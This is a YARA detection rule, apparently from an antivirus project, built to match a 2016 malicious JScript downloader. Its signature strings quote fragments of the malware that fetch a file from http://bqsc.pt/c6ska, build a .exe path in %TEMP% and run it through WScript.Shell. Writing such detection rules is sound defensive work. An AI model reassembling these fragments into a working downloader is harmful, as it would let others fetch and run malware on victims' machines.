rule sig_20160330_697395a0263b5ba9000635ccc0eaf48a {
  meta:
    description = "datamaliciousorder - file 20160330_697395a0263b5ba9000635ccc0eaf48a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9d6308789d1223cad9e552f2d40c27ecb6d8fdc5e131b93de2500c7ca8a32609"

  strings:
    $s1  = "_J[_SR](\"GET\", \"http://bqsc.pt/c6ska\", false);" fullword ascii
    $s2  = "function _L(_UL, _QS){_IN = _IN * 1; return _UL - _QS;};" fullword ascii
    $s3  = "var _KR = function _LJ() {return WScript[_QL](\"WScript\"+\".Shell\");}(), _R0 = 11;" fullword ascii
    $s4  = "if (_J[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _YE() {return _KR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"eSZdDJzVokZ8Y.ex\" + \"e\";};" fullword ascii
    $s6  = "function _V(){return _KI + \"\";};" fullword ascii
    $s7  = "function _FQ() {return ((_R1 == true) && (_R1 == _L0)) ? 1 : _IN;};" fullword ascii
    $s8  = "function _UQ(_LB){_KR[\"Run\"](_LB, _IN, _IN);};" fullword ascii
    $s9  = " while (_P){" fullword ascii
    $s10 = "function _Z(){return 22;};" fullword ascii
    $s11 = "function _H()" fullword ascii
    $s12 = "function _RT(_M) {var _JO = (1, 2, 3, 4, 5, _M); return _JO;};" fullword ascii
    $s13 = "function _R(){return _QL;};" fullword ascii
    $s14 = "return _L(_HM, _ZQ);" fullword ascii
    $s15 = "var _S = new this[\"Date\"]();" fullword ascii
    $s16 = "var _N = false;" fullword ascii
    $s17 = "var _L0 = false;" fullword ascii
    $s18 = "_L0 = true; " fullword ascii
    $s19 = "var _R1 = false;" fullword ascii
    $s20 = "_R1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}